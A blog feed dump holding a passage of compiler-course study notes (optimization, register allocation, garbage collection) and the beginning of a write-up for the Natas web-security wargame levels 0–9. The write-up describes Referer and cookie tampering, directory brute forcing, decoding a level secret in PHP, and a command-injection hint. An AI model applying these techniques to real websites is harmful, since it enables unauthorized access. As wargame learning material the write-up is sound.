src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808153301600.png" class="" title="image-20200808153301600"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808153553893.png" class="" title="image-20200808153553893"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808154013836.png" class="" title="image-20200808154013836"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808154217191.png" class="" title="image-20200808154217191"><h4 id="dynamic-dispatch"><a href="#dynamic-dispatch" class="headerlink" title="dynamic dispatch"></a>dynamic dispatch</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808154401563.png" class="" title="image-20200808154401563"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808154927736.png" class="" title="image-20200808154927736"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808155513811.png" class="" title="image-20200808155513811"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808155706318.png" class="" title="image-20200808155706318"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200808155830158.png" class="" title="image-20200808155830158"><h3 id="PA5"><a href="#PA5" class="headerlink" title="PA5"></a>PA5</h3><h2 id="ä¼˜åŒ–-Optimization"><a href="#ä¼˜åŒ–-Optimization" class="headerlink" title="ä¼˜åŒ– Optimization"></a>ä¼˜åŒ– Optimization</h2><h3 id="Intermediate-Code"><a href="#Intermediate-Code" class="headerlink" title="Intermediate Code"></a>Intermediate Code</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724164441833.png" class="" title="image-20200724164441833"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724164545484.png" class="" title="image-20200724164545484"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724164657828.png" class="" title="image-20200724164657828"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200724165004707.png" class="" title="image-20200724165004707"><h3 id="Optimization-Overview"><a href="#Optimization-Overview" class="headerlink" title="Optimization Overview"></a>Optimization Overview</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727113032723.png" class="" title="image-20200727113032723"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727113227764.png" class="" title="image-20200727113227764"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727114137055.png" class="" title="image-20200727114137055"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727114346148.png" class="" title="image-20200727114346148"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727135941770.png" class="" title="image-20200727135941770"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727140110611.png" class="" title="image-20200727140110611"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727141024199.png" class="" title="image-20200727141024199"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727142541805.png" class="" title="image-20200727142541805"><h3 id="Local-Optimization"><a href="#Local-Optimization" class="headerlink" title="Local Optimization"></a>Local Optimization</h3><p>æœ‰äº›å¯ä»¥åˆ é™¤çš„</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">x</span> = x + <span class="hljs-number">0</span><br><span class="hljs-attr">x</span> = x * <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æœ‰äº›å¯ä»¥ç®€åŒ–çš„</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> * <span class="hljs-number">0</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span><span class="hljs-number">0</span><br>y <span class="hljs-operator">=</span> y ** <span class="hljs-number">2</span> <span class="hljs-operator">=</span>&gt; y <span class="hljs-operator">=</span> y * y<br><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> *<span class="hljs-number">8</span> <span class="hljs-operator">=</span>&gt; <span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> &lt;&lt; <span class="hljs-number">3</span><br><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> * <span class="hljs-number">15</span> <span class="hljs-operator">=</span>&gt; t <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span> &lt;&lt; <span class="hljs-number">4</span><span class="hljs-comment">;x = t - x;</span><br></code></pre></td></tr></table></figure><p>ï¼ˆä¸€äº›æœºå­ä¸Š&lt;&lt;æ¯”*å·å¿«</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727143956671.png" class="" title="image-20200727143956671"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727144813527.png" class="" title="image-20200727144813527"><p>ä¿ç•™æœ€é«˜ç²¾åº¦çš„æµ®ç‚¹æ•°ï¼Œè®©æ¶æ„å†³å®šè®¡ç®—ç»“æœ</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727145423870.png" class="" title="image-20200727145423870"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727145657145.png" class="" title="image-20200727145657145"><h3 id="Peephole-Optimization"><a href="#Peephole-Optimization" class="headerlink" title="Peephole Optimization"></a>Peephole Optimization</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727150656620.png" class="" title="image-20200727150656620"><h3 id="Dataflow-Analysis"><a href="#Dataflow-Analysis" class="headerlink" title="Dataflow Analysis"></a>Dataflow Analysis</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727152656236.png" class="" title="image-20200727152656236"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727152915293.png" class="" title="image-20200727152915293"><h3 id="Constant-Propagation"><a href="#Constant-Propagation" class="headerlink" title="Constant Propagation"></a>Constant Propagation</h3> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727153509070.png" class="" title="image-20200727153509070"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727154004049.png" class="" title="image-20200727154004049"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727154640486.png" class="" title="image-20200727154640486"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727155002293.png" class="" title="image-20200727155002293"><h3 id="Analysis-of-Loops"><a href="#Analysis-of-Loops" class="headerlink" title="Analysis of Loops"></a>Analysis of Loops</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727161011290.png" class="" title="image-20200727161011290"><h3 id="Orderings"><a href="#Orderings" class="headerlink" title="Orderings"></a>Orderings</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727162943132.png" class="" title="image-20200727162943132"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727163013545.png" class="" title="image-20200727163013545"><h3 id="Liveness-Analysis"><a href="#Liveness-Analysis" class="headerlink" title="Liveness Analysis"></a>Liveness Analysis</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727164706188.png" class="" title="image-20200727164706188"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727164954867.png" class="" title="image-20200727164954867"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165049700.png" class="" title="image-20200727165049700"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165134688.png" class="" title="image-20200727165134688"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165215533.png" class="" title="image-20200727165215533"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165457537.png" class="" title="image-20200727165457537"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200727165949003.png" class="" title="image-20200727165949003"> <h3 id="Register-Allocation"><a href="#Register-Allocation" class="headerlink" title="Register Allocation"></a>Register Allocation</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730092739618.png" class="" title="image-20200730092739618"><h4 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730093244462.png" class="" title="image-20200730093244462"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730093639654.png" class="" title="image-20200730093639654"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730093758586.png" class="" title="image-20200730093758586"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730094201480.png" class="" title="image-20200730094201480"><h3 id="Graph-Coloring"><a href="#Graph-Coloring" class="headerlink" title="Graph Coloring"></a>Graph Coloring</h3><p>A <strong>coloring of a graph</strong> is an assignment of colors to nodes, sch that nodes connected by an edge have different colors.</p><p>A graph is <strong>k-colorable</strong> if it has a coloring with k colors.In here, colors = registers. Let k = number of machine registers.</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730100849423.png" class="" title="image-20200730100849423"><p>å†ç”¨å¯„å­˜å™¨åå­—æ›¿æ¢</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730101320589.png" class="" title="image-20200730101320589"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730104742443.png" class="" title="image-20200730104742443"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730105029797.png" class="" title="image-20200730105029797"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730105203033.png" class="" title="image-20200730105203033"><h4 id="example-3"><a href="#example-3" class="headerlink" title="example"></a>example</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730105810302.png" class="" title="image-20200730105810302"><p>Remove d Stack:{d,a}</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730105936761.png" class="" title="image-20200730105936761"><p> now it doesnâ€™t matter which node we pick because we can process them in any</p><p>Remove c,b,e,f </p><p><strong>now Empty-graph - done with the first part</strong></p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730110258876.png" class="" title="image-20200730110258876"><p>going to pick the <strong>lowest numbered register</strong> that is not used by any of its neighbors. </p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730110339115.png" class="" title="image-20200730110339115"><p>b is the only register that isnt used</p><h3 id="Spilling"><a href="#Spilling" class="headerlink" title="Spilling"></a>Spilling</h3><p>if tgereâ€™s no node that we can delete from the graph, in this situation, weâ€™re going to pick and know that<br>there is a candidate for spilling.</p><ul><li>A spilled value â€œlivesâ€ in memory</li></ul><blockquote><p>optimisitic coloring =&gt; hope that among the 4 neighbors of f we use less than 3 colors</p></blockquote><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730112509274.png" class="" title="image-20200730112509274"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730112551179.png" class="" title="image-20200730112551179"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730113112519.png" class="" title="image-20200730113112519"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730112936005.png" class="" title="image-20200730112936005"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730113228217.png" class="" title="image-20200730113228217"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730113618452.png" class="" title="image-20200730113618452"><h3 id="Managing-Caches"><a href="#Managing-Caches" class="headerlink" title="Managing Caches"></a>Managing Caches</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730114154225.png" class="" title="image-20200730114154225"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730114748858.png" class="" title="image-20200730114748858"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730114725025.png" class="" title="image-20200730114725025"><h2 id="Garbage-collection"><a href="#Garbage-collection" class="headerlink" title="Garbage collection"></a>Garbage collection</h2><h3 id="Automatic-Memory-Management"><a href="#Automatic-Memory-Management" class="headerlink" title="Automatic Memory Management"></a>Automatic Memory Management</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730144340907.png" class="" title="image-20200730144340907"><h4 id="How-to-know-an-object-will-â€œnever-be-used-againâ€"><a href="#How-to-know-an-object-will-â€œnever-be-used-againâ€" class="headerlink" title="How to know an object will â€œnever be used againâ€?"></a>How to know an object will â€œnever be used againâ€?</h4><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730145148008.png" class="" title="image-20200730145148008"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730145452186.png" class="" title="image-20200730145452186"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730150153526.png" class="" title="image-20200730150153526"> <img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730150244426.png" class="" title="image-20200730150244426"><h3 id="Mark-and-Sweep"><a href="#Mark-and-Sweep" class="headerlink" title="Mark and Sweep"></a>Mark and Sweep</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730150356190.png" class="" title="image-20200730150356190"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730150542396.png" class="" title="image-20200730150542396"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730162740553.png" class="" title="image-20200730162740553"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730163335635.png" class="" title="image-20200730163335635"><h3 id="Stop-and-Copy"><a href="#Stop-and-Copy" class="headerlink" title="Stop and Copy"></a>Stop and Copy</h3><p>å½“æ—§åŒºåŸŸæ»¡çš„æ—¶å€™ï¼Œå°†æœ‰ç”¨çš„å¤åˆ¶åˆ°æ–°åŒºåŸŸï¼Œç„¶åæ–°æ—§åŒºåŸŸåå­—å¯¹æ¢ã€‚</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730171624649.png" class="" title="image-20200730171624649"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730171725223.png" class="" title="image-20200730171725223"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730172133916.png" class="" title="image-20200730172133916"><p>è¢«å¤åˆ¶è¿‡å»ä¹‹åï¼ŒæŒ‡é’ˆè®¿é—®æ—§åŒºåŸŸçš„æ—¶å€™ï¼Œä¼šå‘ç°æ—§åŒºåŸŸå·²è¢«æ ‡è®°ï¼Œç„¶åä¼šæ›´æ–°æŒ‡é’ˆæŒ‡å‘æ–°åŒºåŸŸ</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730172842124.png" class="" title="image-20200730172842124"><p>scanåˆ°allocä¹‹é—´å°±æ˜¯éœ€è¦è¢«æ›´æ–°çš„</p><h4 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h4><p>å…ˆå¤åˆ¶Aï¼Œç„¶åæ ¹æ®æŒ‡å‘æŒ‰åºå¤åˆ¶åˆ°æ–°åŒºåŸŸå¹¶æ›´æ–°pointer</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730173025615.png" class="" title="image-20200730173025615"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730173211485.png" class="" title="image-20200730173211485"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730174134335.png" class="" title="image-20200730174134335"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730174236562.png" class="" title="image-20200730174236562"><h3 id="Conservative-Collection"><a href="#Conservative-Collection" class="headerlink" title="Conservative Collection"></a>Conservative Collection</h3><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730175043466.png" class="" title="image-20200730175043466"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730175410736.png" class="" title="image-20200730175410736"><h3 id="Reference-Counting"><a href="#Reference-Counting" class="headerlink" title="Reference Counting"></a>Reference Counting</h3><p>Try to collect an object when there are no more pointers to it.</p><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730180530542.png" class="" title="image-20200730180530542"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730181146802.png" class="" title="image-20200730181146802"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730181841627.png" class="" title="image-20200730181841627"><img src="/2020/06/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200730182213114.png" class="" title="image-20200730182213114">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Natas</title>
    <link href="/2020/05/23/Natas/"/>
    <url>/2020/05/23/Natas/</url>
    
    <content type="html"><![CDATA[<h2 id="natas0"><a href="#natas0" class="headerlink" title="natas0"></a>natas0</h2><h2 id="natas1"><a href="#natas1" class="headerlink" title="natas1"></a>natas1</h2><p>ç¦ç”¨äº†å³é”®ï¼Œä½†è¿˜æ˜¯å¯ä»¥F12æˆ–è€…</p><h2 id="natas2"><a href="#natas2" class="headerlink" title="natas2"></a>natas2</h2><p>æ‰“å¼€è¿‡<code>files/pixel.png</code>ï¼Œä½†æ²¡æƒ³åˆ°è¿™æ˜¯ç›®å½•æƒé™é—®é¢˜ã€‚ã€‚ã€‚ã€‚é¡ºä¾¿æœäº†ä¸€ä¸‹çˆ†ç ´æ–‡ä»¶ç›®å½•çš„å·¥å…·ï¼Œkaliè‡ªå¸¦çš„dirbuster <a href="https://www.cnblogs.com/xz25/p/12829315.html">link</a></p><h2 id="natas3"><a href="#natas3" class="headerlink" title="natas3"></a>natas3</h2><p>è°·æ­Œæ‰¾ä¸åˆ°â€“ä¹-æ›²-å-å…«-å¼¯â€”&gt;robots.txt</p><p>awsl</p><h2 id="natas4"><a href="#natas4" class="headerlink" title="natas4"></a>natas4</h2><p>ç‚¹å‡»refreshä¹‹åRefererä¼šæ˜¾ç¤ºï¼Œæ”¹æˆå¯¹åº”çš„natas5å³å¯</p><h2 id="natas5"><a href="#natas5" class="headerlink" title="natas5"></a>natas5</h2><p>Login, é‚£å°±çœ‹cookie</p><p>æ”¹æˆ1å°±è¡Œ</p><h2 id="natas6"><a href="#natas6" class="headerlink" title="natas6"></a>natas6</h2><p>æ‰“å¼€å†æŒ‰f12å°±å¯ä»¥çœ‹è§äº†</p><h2 id="natas7"><a href="#natas7" class="headerlink" title="natas7"></a>natas7</h2><p>çœ‹åˆ°hintä¹‹åï¼Œå°±å°è¯•åœ¨urlä¸­å°è¯•page=ls</p><p>ç­‰å·åè¾“å…¥hintçš„å°±è¡Œ</p><h2 id="natas8"><a href="#natas8" class="headerlink" title="natas8"></a>natas8</h2><p>ç»™çš„å¾ˆæ¸…æ¥šï¼Œè¾“å…¥çš„æ•°å€¼ï¼Œå…ˆbase64_encodeï¼Œå†strrevï¼Œå†bin2hexï¼Œå¦‚æœå’ŒencodedSecretä¸€æ ·å°±getäº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span><br><span class="hljs-variable">$encodedSecret</span> = <span class="hljs-string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;<br><span class="hljs-variable">$result</span> = base64_decode(strrev(hex2bin(<span class="hljs-variable">$encodedSecret</span>)));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>mac è‡ªå¸¦äº†phpç¯å¢ƒhhhçœŸå¥½</p></blockquote><h2 id="natas9"><a href="#natas9" class="headerlink" title="natas9"></a>natas9</h2><p>å‘½ä»¤æ³¨å…¥</p><blockquote><p>passthru ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] ) : void</p><p>åŒ <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> å‡½æ•°ç±»ä¼¼ï¼Œ <strong>passthru()</strong> å‡½æ•° ä¹Ÿæ˜¯ç”¨æ¥æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ï¼ˆ<code>command</code>ï¼‰çš„ã€‚ å½“æ‰€æ‰§è¡Œçš„ Unix å‘½ä»¤è¾“å‡ºäºŒè¿›åˆ¶æ•°æ®ï¼Œ å¹¶ä¸”éœ€è¦ç›´æ¥ä¼ é€åˆ°æµè§ˆå™¨çš„æ—¶å€™ï¼Œ éœ€è¦ç”¨æ­¤å‡½æ•°æ¥æ›¿ä»£ <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> æˆ– <a href="https://www.php.net/manual/zh/function.system.php">system()</a> å‡½æ•°ã€‚ å¸¸ç”¨æ¥æ‰§è¡Œè¯¸å¦‚ pbmplus ä¹‹ç±»çš„å¯ä»¥ç›´æ¥è¾“å‡ºå›¾åƒæµçš„å‘½ä»¤ã€‚ é€šè¿‡è®¾ç½® Content-type ä¸º <em>image/gif</em>ï¼Œ ç„¶åè°ƒç”¨ pbmplus ç¨‹åºè¾“å‡º gif æ–‡ä»¶ï¼Œ å°±å¯ä»¥ä» PHP 